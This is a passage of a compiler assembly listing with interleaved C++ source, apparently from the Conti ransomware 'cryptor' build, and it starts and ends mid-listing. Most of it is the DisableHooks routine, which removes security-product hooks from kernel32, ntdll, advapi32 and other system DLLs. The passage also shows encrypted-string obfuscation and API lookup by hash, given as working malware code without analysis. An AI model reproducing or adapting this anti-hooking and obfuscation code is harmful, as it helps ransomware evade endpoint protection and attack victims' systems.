  00504	03 d0		 add	 edx, eax
  00506	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00509	2b c8		 sub	 ecx, eax
  0050b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00510	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00513	f7 e9		 imul	 ecx
  00515	03 d1		 add	 edx, ecx
  00517	c1 fa 06	 sar	 edx, 6
  0051a	8b c2		 mov	 eax, edx
  0051c	c1 e8 1f	 shr	 eax, 31
  0051f	03 d0		 add	 edx, eax
  00521	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00524	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00526	42 88 4c 05 e8	 mov	 BYTE PTR $T7[rbp+r8-184], cl
  0052b	49 ff c0	 inc	 r8
  0052e	49 83 f8 0d	 cmp	 r8, 13
  00532	72 ac		 jb	 SHORT $LL281@DisableHoo
$LN280@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00534	ba 0f 00 00 00	 mov	 edx, 15
  00539	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  0053f	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00543	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00548	48 8d 4d e8	 lea	 rcx, QWORD PTR $T7[rbp-184]
  0054c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0054e	88 5d f7	 mov	 BYTE PTR $T8[rbp-185], bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  00551	4c 8b e0	 mov	 r12, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00554	c6 45 f8 30	 mov	 BYTE PTR $T8[rbp-184], 48 ; 00000030H
  00558	c6 45 f9 5d	 mov	 BYTE PTR $T8[rbp-183], 93 ; 0000005dH
  0055c	c6 45 fa 22	 mov	 BYTE PTR $T8[rbp-182], 34 ; 00000022H
  00560	c6 45 fb 29	 mov	 BYTE PTR $T8[rbp-181], 41 ; 00000029H
  00564	c6 45 fc 6d	 mov	 BYTE PTR $T8[rbp-180], 109 ; 0000006dH
  00568	c6 45 fd 12	 mov	 BYTE PTR $T8[rbp-179], 18
  0056c	c6 45 fe 4e	 mov	 BYTE PTR $T8[rbp-178], 78 ; 0000004eH
  00570	c6 45 ff 41	 mov	 BYTE PTR $T8[rbp-177], 65 ; 00000041H
  00574	c6 45 00 0d	 mov	 BYTE PTR $T8[rbp-176], 13
  00578	c6 45 01 50	 mov	 BYTE PTR $T8[rbp-175], 80 ; 00000050H
  0057c	c6 45 02 39	 mov	 BYTE PTR $T8[rbp-174], 57 ; 00000039H
  00580	c6 45 03 39	 mov	 BYTE PTR $T8[rbp-173], 57 ; 00000039H
  00584	c6 45 04 32	 mov	 BYTE PTR $T8[rbp-172], 50 ; 00000032H
  00588	0f b6 45 f8	 movzx	 eax, BYTE PTR $T8[rbp-184]

; 58   :         return m_isDecrypted;

  0058c	0f b6 45 f7	 movzx	 eax, BYTE PTR $T8[rbp-185]

; 63   :         if (!isDecrypted())

  00590	84 c0		 test	 al, al
  00592	75 5d		 jne	 SHORT $LN322@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00594	4c 8b c3	 mov	 r8, rbx
  00597	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL323@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005a0	42 0f b6 4c 05
	f8		 movzx	 ecx, BYTE PTR $T8[rbp+r8-184]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  005a6	b8 32 00 00 00	 mov	 eax, 50			; 00000032H
  005ab	2b c1		 sub	 eax, ecx
  005ad	6b c8 27	 imul	 ecx, eax, 39		; 00000027H

; 40   :     return (a % n + n) % n;

  005b0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005b5	f7 e9		 imul	 ecx
  005b7	03 d1		 add	 edx, ecx
  005b9	c1 fa 06	 sar	 edx, 6
  005bc	8b c2		 mov	 eax, edx
  005be	c1 e8 1f	 shr	 eax, 31
  005c1	03 d0		 add	 edx, eax
  005c3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005c6	2b c8		 sub	 ecx, eax
  005c8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005cd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  005d0	f7 e9		 imul	 ecx
  005d2	03 d1		 add	 edx, ecx
  005d4	c1 fa 06	 sar	 edx, 6
  005d7	8b c2		 mov	 eax, edx
  005d9	c1 e8 1f	 shr	 eax, 31
  005dc	03 d0		 add	 edx, eax
  005de	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005e1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005e3	42 88 4c 05 f8	 mov	 BYTE PTR $T8[rbp+r8-184], cl
  005e8	49 ff c0	 inc	 r8
  005eb	49 83 f8 0d	 cmp	 r8, 13
  005ef	72 af		 jb	 SHORT $LL323@DisableHoo
$LN322@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  005f1	ba 0f 00 00 00	 mov	 edx, 15
  005f6	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  005fc	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00600	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00605	48 8d 4d f8	 lea	 rcx, QWORD PTR $T8[rbp-184]
  00609	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0060b	88 5d 07	 mov	 BYTE PTR $T9[rbp-185], bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  0060e	4c 8b f0	 mov	 r14, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00611	c6 45 08 73	 mov	 BYTE PTR $T9[rbp-184], 115 ; 00000073H
  00615	c6 45 09 10	 mov	 BYTE PTR $T9[rbp-183], 16
  00619	c6 45 0a 07	 mov	 BYTE PTR $T9[rbp-182], 7
  0061d	c6 45 0b 4b	 mov	 BYTE PTR $T9[rbp-181], 75 ; 0000004bH
  00621	c6 45 0c 10	 mov	 BYTE PTR $T9[rbp-180], 16
  00625	c6 45 0d 0f	 mov	 BYTE PTR $T9[rbp-179], 15
  00629	c6 45 0e 10	 mov	 BYTE PTR $T9[rbp-178], 16
  0062d	c6 45 0f 18	 mov	 BYTE PTR $T9[rbp-177], 24
  00631	c6 45 10 25	 mov	 BYTE PTR $T9[rbp-176], 37 ; 00000025H
  00635	c6 45 11 42	 mov	 BYTE PTR $T9[rbp-175], 66 ; 00000042H
  00639	c6 45 12 4b	 mov	 BYTE PTR $T9[rbp-174], 75 ; 0000004bH
  0063d	c6 45 13 4b	 mov	 BYTE PTR $T9[rbp-173], 75 ; 0000004bH
  00641	c6 45 14 11	 mov	 BYTE PTR $T9[rbp-172], 17
  00645	0f b6 45 08	 movzx	 eax, BYTE PTR $T9[rbp-184]

; 58   :         return m_isDecrypted;

  00649	0f b6 45 07	 movzx	 eax, BYTE PTR $T9[rbp-185]

; 63   :         if (!isDecrypted())

  0064d	84 c0		 test	 al, al
  0064f	75 64		 jne	 SHORT $LN364@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00651	4c 8b cb	 mov	 r9, rbx
  00654	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL365@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00660	42 0f b6 4c 0d
	08		 movzx	 ecx, BYTE PTR $T9[rbp+r9-184]

; 40   :     return (a % n + n) % n;

  00666	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0066b	83 e9 11	 sub	 ecx, 17
  0066e	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00672	41 f7 e8	 imul	 r8d
  00675	41 03 d0	 add	 edx, r8d
  00678	c1 fa 06	 sar	 edx, 6
  0067b	8b c2		 mov	 eax, edx
  0067d	c1 e8 1f	 shr	 eax, 31
  00680	03 d0		 add	 edx, eax
  00682	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00685	44 2b c0	 sub	 r8d, eax
  00688	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0068d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00691	41 f7 e8	 imul	 r8d
  00694	41 03 d0	 add	 edx, r8d
  00697	c1 fa 06	 sar	 edx, 6
  0069a	8b c2		 mov	 eax, edx
  0069c	c1 e8 1f	 shr	 eax, 31
  0069f	03 d0		 add	 edx, eax
  006a1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  006a4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  006a7	46 88 44 0d 08	 mov	 BYTE PTR $T9[rbp+r9-184], r8b
  006ac	49 ff c1	 inc	 r9
  006af	49 83 f9 0d	 cmp	 r9, 13
  006b3	72 ab		 jb	 SHORT $LL365@DisableHoo
$LN364@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  006b5	ba 0f 00 00 00	 mov	 edx, 15
  006ba	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  006c0	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  006c4	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  006c9	48 8d 4d 08	 lea	 rcx, QWORD PTR $T9[rbp-184]
  006cd	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  006cf	88 5d 97	 mov	 BYTE PTR $T10[rbp-185], bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  006d2	48 8b f0	 mov	 rsi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  006d5	c6 45 98 23	 mov	 BYTE PTR $T10[rbp-184], 35 ; 00000023H
  006d9	c6 45 99 32	 mov	 BYTE PTR $T10[rbp-183], 50 ; 00000032H
  006dd	c6 45 9a 47	 mov	 BYTE PTR $T10[rbp-182], 71 ; 00000047H
  006e1	c6 45 9b 61	 mov	 BYTE PTR $T10[rbp-181], 97 ; 00000061H
  006e5	c6 45 9c 2d	 mov	 BYTE PTR $T10[rbp-180], 45 ; 0000002dH
  006e9	c6 45 9d 5c	 mov	 BYTE PTR $T10[rbp-179], 92 ; 0000005cH
  006ed	c6 45 9e 57	 mov	 BYTE PTR $T10[rbp-178], 87 ; 00000057H
  006f1	c6 45 9f 3f	 mov	 BYTE PTR $T10[rbp-177], 63 ; 0000003fH
  006f5	c6 45 a0 1d	 mov	 BYTE PTR $T10[rbp-176], 29
  006f9	c6 45 a1 47	 mov	 BYTE PTR $T10[rbp-175], 71 ; 00000047H
  006fd	c6 45 a2 47	 mov	 BYTE PTR $T10[rbp-174], 71 ; 00000047H
  00701	c6 45 a3 0c	 mov	 BYTE PTR $T10[rbp-173], 12
  00705	0f b6 4d 98	 movzx	 ecx, BYTE PTR $T10[rbp-184]

; 58   :         return m_isDecrypted;

  00709	0f b6 45 97	 movzx	 eax, BYTE PTR $T10[rbp-185]

; 63   :         if (!isDecrypted())

  0070d	84 c0		 test	 al, al
  0070f	75 63		 jne	 SHORT $LN404@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00711	4c 8b c3	 mov	 r8, rbx
  00714	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL405@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00720	42 0f b6 4c 05
	98		 movzx	 ecx, BYTE PTR $T10[rbp+r8-184]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00726	b8 0c 00 00 00	 mov	 eax, 12
  0072b	2b c1		 sub	 eax, ecx
  0072d	8d 0c 40	 lea	 ecx, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  00730	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00735	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  00738	f7 e9		 imul	 ecx
  0073a	03 d1		 add	 edx, ecx
  0073c	c1 fa 06	 sar	 edx, 6
  0073f	8b c2		 mov	 eax, edx
  00741	c1 e8 1f	 shr	 eax, 31
  00744	03 d0		 add	 edx, eax
  00746	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00749	2b c8		 sub	 ecx, eax
  0074b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00750	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00753	f7 e9		 imul	 ecx
  00755	03 d1		 add	 edx, ecx
  00757	c1 fa 06	 sar	 edx, 6
  0075a	8b c2		 mov	 eax, edx
  0075c	c1 e8 1f	 shr	 eax, 31
  0075f	03 d0		 add	 edx, eax
  00761	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00764	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00766	42 88 4c 05 98	 mov	 BYTE PTR $T10[rbp+r8-184], cl
  0076b	49 ff c0	 inc	 r8
  0076e	49 83 f8 0c	 cmp	 r8, 12
  00772	72 ac		 jb	 SHORT $LL405@DisableHoo
$LN404@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00774	ba 0f 00 00 00	 mov	 edx, 15
  00779	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  0077f	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00783	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00788	48 8d 4d 98	 lea	 rcx, QWORD PTR $T10[rbp-184]
  0078c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0078e	88 5d a7	 mov	 BYTE PTR $T11[rbp-185], bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  00791	48 8b f8	 mov	 rdi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00794	c6 45 a8 6f	 mov	 BYTE PTR $T11[rbp-184], 111 ; 0000006fH
  00798	c6 45 a9 59	 mov	 BYTE PTR $T11[rbp-183], 89 ; 00000059H
  0079c	c6 45 aa 4a	 mov	 BYTE PTR $T11[rbp-182], 74 ; 0000004aH
  007a0	c6 45 ab 6d	 mov	 BYTE PTR $T11[rbp-181], 109 ; 0000006dH
  007a4	c6 45 ac 6d	 mov	 BYTE PTR $T11[rbp-180], 109 ; 0000006dH
  007a8	c6 45 ad 4e	 mov	 BYTE PTR $T11[rbp-179], 78 ; 0000004eH
  007ac	c6 45 ae 49	 mov	 BYTE PTR $T11[rbp-178], 73 ; 00000049H
  007b0	c6 45 af 35	 mov	 BYTE PTR $T11[rbp-177], 53 ; 00000035H
  007b4	c6 45 b0 45	 mov	 BYTE PTR $T11[rbp-176], 69 ; 00000045H
  007b8	c6 45 b1 6d	 mov	 BYTE PTR $T11[rbp-175], 109 ; 0000006dH
  007bc	c6 45 b2 6d	 mov	 BYTE PTR $T11[rbp-174], 109 ; 0000006dH
  007c0	c6 45 b3 4d	 mov	 BYTE PTR $T11[rbp-173], 77 ; 0000004dH
  007c4	0f b6 4d a8	 movzx	 ecx, BYTE PTR $T11[rbp-184]

; 58   :         return m_isDecrypted;

  007c8	0f b6 45 a7	 movzx	 eax, BYTE PTR $T11[rbp-185]

; 63   :         if (!isDecrypted())

  007cc	84 c0		 test	 al, al
  007ce	75 54		 jne	 SHORT $LN444@DisableHoo
$LL445@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  007d0	0f b6 4c 1d a8	 movzx	 ecx, BYTE PTR $T11[rbp+rbx-184]

; 40   :     return (a % n + n) % n;

  007d5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  007da	83 e9 4d	 sub	 ecx, 77			; 0000004dH
  007dd	44 6b d1 33	 imul	 r10d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  007e1	41 f7 ea	 imul	 r10d
  007e4	41 03 d2	 add	 edx, r10d
  007e7	c1 fa 06	 sar	 edx, 6
  007ea	8b c2		 mov	 eax, edx
  007ec	c1 e8 1f	 shr	 eax, 31
  007ef	03 d0		 add	 edx, eax
  007f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  007f4	44 2b d0	 sub	 r10d, eax
  007f7	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  007fc	41 83 c2 7f	 add	 r10d, 127		; 0000007fH
  00800	41 f7 ea	 imul	 r10d
  00803	41 03 d2	 add	 edx, r10d
  00806	c1 fa 06	 sar	 edx, 6
  00809	8b c2		 mov	 eax, edx
  0080b	c1 e8 1f	 shr	 eax, 31
  0080e	03 d0		 add	 edx, eax
  00810	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00813	44 2b d0	 sub	 r10d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00816	44 88 54 1d a8	 mov	 BYTE PTR $T11[rbp+rbx-184], r10b
  0081b	48 ff c3	 inc	 rbx
  0081e	48 83 fb 0c	 cmp	 rbx, 12
  00822	72 ac		 jb	 SHORT $LL445@DisableHoo
$LN444@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00824	ba 0f 00 00 00	 mov	 edx, 15
  00829	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  0082f	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00833	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00838	48 8d 4d a8	 lea	 rcx, QWORD PTR $T11[rbp-184]
  0083c	ff d0		 call	 rax
  0083e	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp

; 29   :     if (hKernel32) {

  00841	48 8b 45 67	 mov	 rax, QWORD PTR hKernel32$1$[rbp-185]
  00845	48 85 c0	 test	 rax, rax
  00848	74 08		 je	 SHORT $LN2@DisableHoo

; 30   :         removeHooks(hKernel32);

  0084a	48 8b c8	 mov	 rcx, rax
  0084d	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN2@DisableHoo:

; 31   :     }
; 32   : 
; 33   : 
; 34   :     if (hWs2_32) {

  00852	48 8b 45 6f	 mov	 rax, QWORD PTR hWs2_32$1$[rbp-185]
  00856	48 85 c0	 test	 rax, rax
  00859	74 08		 je	 SHORT $LN3@DisableHoo

; 35   :         removeHooks(hWs2_32);

  0085b	48 8b c8	 mov	 rcx, rax
  0085e	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN3@DisableHoo:

; 36   :     }
; 37   : 
; 38   :     if (hAdvapi32) {

  00863	48 8b 45 77	 mov	 rax, QWORD PTR hAdvapi32$1$[rbp-185]
  00867	48 85 c0	 test	 rax, rax
  0086a	74 08		 je	 SHORT $LN4@DisableHoo

; 39   :         removeHooks(hAdvapi32);

  0086c	48 8b c8	 mov	 rcx, rax
  0086f	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN4@DisableHoo:

; 40   :     }
; 41   : 
; 42   : 
; 43   :     if (hRstrtmgr) {

  00874	4d 85 ed	 test	 r13, r13
  00877	74 12		 je	 SHORT $LN5@DisableHoo

; 44   : 
; 45   :         getapi::SetRestartManagerLoaded(TRUE);
; 46   :         removeHooks(hRstrtmgr);

  00879	49 8b cd	 mov	 rcx, r13
  0087c	c7 05 00 00 00
	00 01 00 00 00	 mov	 DWORD PTR ?g_IsRstrtMgrLoaded@@3HA, 1 ; g_IsRstrtMgrLoaded
  00886	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN5@DisableHoo:

; 47   : 
; 48   :     }
; 49   : 
; 50   :     if (hOle32) {

  0088b	4d 85 ff	 test	 r15, r15
  0088e	74 08		 je	 SHORT $LN6@DisableHoo

; 51   :         removeHooks(hOle32);

  00890	49 8b cf	 mov	 rcx, r15
  00893	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN6@DisableHoo:

; 52   :     }
; 53   : 
; 54   :     if (hOleAut) {

  00898	4d 85 e4	 test	 r12, r12
  0089b	74 08		 je	 SHORT $LN7@DisableHoo

; 55   :         removeHooks(hOle32);

  0089d	49 8b cf	 mov	 rcx, r15
  008a0	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN7@DisableHoo:

; 56   :     }
; 57   : 
; 58   :     if (hNetApi32) {

  008a5	4d 85 f6	 test	 r14, r14
  008a8	74 08		 je	 SHORT $LN8@DisableHoo

; 59   :         removeHooks(hNetApi32);

  008aa	49 8b ce	 mov	 rcx, r14
  008ad	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN8@DisableHoo:

; 60   :     }
; 61   : 
; 62   :     if (hIphlp32) {

  008b2	48 85 f6	 test	 rsi, rsi
  008b5	74 08		 je	 SHORT $LN9@DisableHoo

; 63   :         removeHooks(hIphlp32);

  008b7	48 8b ce	 mov	 rcx, rsi
  008ba	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN9@DisableHoo:

; 64   :     }
; 65   : 
; 66   :     if (hShlwapi) {

  008bf	48 85 ff	 test	 rdi, rdi
  008c2	74 08		 je	 SHORT $LN10@DisableHoo

; 67   :         removeHooks(hShlwapi);

  008c4	48 8b cf	 mov	 rcx, rdi
  008c7	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN10@DisableHoo:

; 68   :     }
; 69   : 
; 70   :     if (hShell32) {

  008cc	48 85 db	 test	 rbx, rbx
  008cf	74 08		 je	 SHORT $LN11@DisableHoo

; 71   :         removeHooks(hShell32);

  008d1	48 8b cb	 mov	 rcx, rbx
  008d4	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN11@DisableHoo:

; 72   :     }
; 73   : 
; 74   :     if (hNtdll) {

  008d9	48 8b 45 7f	 mov	 rax, QWORD PTR hNtdll$1$[rbp-185]
  008dd	48 85 c0	 test	 rax, rax
  008e0	74 08		 je	 SHORT $LN12@DisableHoo

; 75   :         removeHooks(hNtdll);

  008e2	48 8b c8	 mov	 rcx, rax
  008e5	e8 00 00 00 00	 call	 ?removeHooks@@YAXPEAUHINSTANCE__@@@Z ; removeHooks
$LN12@DisableHoo:

; 76   :     }
; 77   : 
; 78   : }

  008ea	48 81 c4 d8 00
	00 00		 add	 rsp, 216		; 000000d8H
  008f1	41 5f		 pop	 r15
  008f3	41 5e		 pop	 r14
  008f5	41 5d		 pop	 r13
  008f7	41 5c		 pop	 r12
  008f9	5f		 pop	 rdi
  008fa	5e		 pop	 rsi
  008fb	5b		 pop	 rbx
  008fc	5d		 pop	 rbp
  008fd	c3		 ret	 0
?DisableHooks@@YAXXZ ENDP				; DisableHooks
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
;	COMDAT ?m_memcmp@@YAHPEBX0_K@Z
_TEXT	SEGMENT
buf1$ = 8
buf2$ = 16
count$dead$ = 24
?m_memcmp@@YAHPEBX0_K@Z PROC				; m_memcmp, COMDAT

; 81   : {

  00000	4c 8b ca	 mov	 r9, rdx

; 82   :     if (!buf1 || !buf2)

  00003	48 85 c9	 test	 rcx, rcx
  00006	74 38		 je	 SHORT $LN6@m_memcmp
  00008	48 85 d2	 test	 rdx, rdx
  0000b	74 33		 je	 SHORT $LN6@m_memcmp

; 85   :     }
; 86   : 
; 87   :     unsigned char* p1 = (unsigned char*)buf1;
; 88   :     unsigned char* p2 = (unsigned char*)buf2;
; 89   : 
; 90   :     int   rc = 0;

  0000d	45 33 c0	 xor	 r8d, r8d
  00010	41 8b c0	 mov	 eax, r8d
$LL4@m_memcmp:

; 91   : 
; 92   :     for (size_t i = 0; i < count; i++)
; 93   :     {
; 94   :         if (*p1 < *p2)

  00013	0f b6 14 08	 movzx	 edx, BYTE PTR [rax+rcx]
  00017	42 3a 14 08	 cmp	 dl, BYTE PTR [rax+r9]
  0001b	72 19		 jb	 SHORT $LN11@m_memcmp

; 97   :             break;
; 98   :         }
; 99   : 
; 100  :         if (*p1 > * p2)

  0001d	77 0d		 ja	 SHORT $LN12@m_memcmp

; 103  :             break;
; 104  :         }
; 105  : 
; 106  :         p1++;
; 107  :         p2++;

  0001f	48 ff c0	 inc	 rax
  00022	48 83 f8 02	 cmp	 rax, 2
  00026	72 eb		 jb	 SHORT $LL4@m_memcmp

; 108  :     }
; 109  : 
; 110  :     return rc;

  00028	41 8b c0	 mov	 eax, r8d

; 111  : }

  0002b	c3		 ret	 0
$LN12@m_memcmp:

; 101  :         {
; 102  :             rc = 1;

  0002c	41 b8 01 00 00
	00		 mov	 r8d, 1

; 108  :     }
; 109  : 
; 110  :     return rc;

  00032	41 8b c0	 mov	 eax, r8d

; 111  : }

  00035	c3		 ret	 0
$LN11@m_memcmp:

; 95   :         {
; 96   :             rc = -1;

  00036	41 b8 ff ff ff
	ff		 mov	 r8d, -1

; 108  :     }
; 109  : 
; 110  :     return rc;

  0003c	41 8b c0	 mov	 eax, r8d

; 111  : }

  0003f	c3		 ret	 0
$LN6@m_memcmp:

; 83   :     {
; 84   :         return -1;

  00040	b8 ff ff ff ff	 mov	 eax, -1

; 111  : }

  00045	c3		 ret	 0
?m_memcmp@@YAHPEBX0_K@Z ENDP				; m_memcmp
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\antihooks\antihooks.cpp
;	COMDAT ?Rva2Offset@@YAKK_K@Z
_TEXT	SEGMENT
dwRva$ = 8
uiBaseAddress$ = 16
?Rva2Offset@@YAKK_K@Z PROC				; Rva2Offset, COMDAT

; 114  : {

$LN25:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx

; 115  :     WORD wIndex = 0;
; 116  :     WORD wNumberOfSections = 0;
; 117  :     PIMAGE_SECTION_HEADER pSectionHeader = NULL;
; 118  : 
; 119  :     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

  00005	4c 63 5a 3c	 movsxd	 r11, DWORD PTR [rdx+60]
  00009	44 8b d1	 mov	 r10d, ecx
  0000c	4c 03 da	 add	 r11, rdx

; 120  : 
; 121  :     if (pNtHeaders->OptionalHeader.Magic == 0x010B) {

